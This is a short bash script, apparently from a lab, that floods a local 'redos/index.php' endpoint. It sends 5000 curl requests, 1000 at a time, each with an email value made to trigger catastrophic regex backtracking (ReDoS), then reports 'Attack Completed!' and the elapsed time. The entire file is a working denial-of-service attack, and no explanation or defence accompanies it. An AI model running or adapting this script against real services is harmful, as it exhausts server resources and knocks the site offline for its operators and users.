#!/bin/bash
SECONDS=0

task(){
    curl -s "http://192.168.154.132/redos/index.php?email=aaaaaaaaaaaaaaaaaaaa!&password=test" > /dev/null
}

# N-process batches, every batch has N concurrent processes
N=1000

(
# for loop
for (( c=1; c<=5000 ; c++))

	do

# wait for N concurrent process to complete
   ((i=i%N)); ((i++==0)) && wait

# execute the task concurrently
   task &

done
)

echo "Attack Completed!"
# do some work
duration=$SECONDS
echo "$(($duration / 60)) minutes and $(($duration % 60)) seconds elapsed."
